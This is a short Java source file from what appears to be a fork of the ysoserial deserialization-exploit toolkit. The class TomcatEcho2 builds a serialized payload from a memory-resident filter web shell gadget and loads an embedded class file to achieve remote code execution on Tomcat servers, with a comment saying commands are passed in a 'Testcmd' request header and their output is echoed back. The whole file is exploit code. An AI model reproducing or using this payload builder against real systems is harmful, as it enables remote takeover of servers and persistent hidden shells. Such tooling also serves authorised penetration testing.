package ysoserial.payloads.rceecho;


import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.memshell.FilterShell;
import ysoserial.payloads.util.ClassFiles;

import java.io.InputStream;

// tomcat rce 回显，header : Testcmd=id
public class TomcatEcho2 {
    public static void main(final String[] args) throws Exception {
        Object evil = new FilterShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }
    public Object getObject(Class gadget) throws Exception {
        InputStream inputStream = TomcatEcho2.class.getClassLoader().getResourceAsStream("rce回显/xray.class.txt");
        byte[] bytes = IOUtils.toByteArray(inputStream);
        Class c = ClassFiles.bytesAsClass(bytes);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }
}
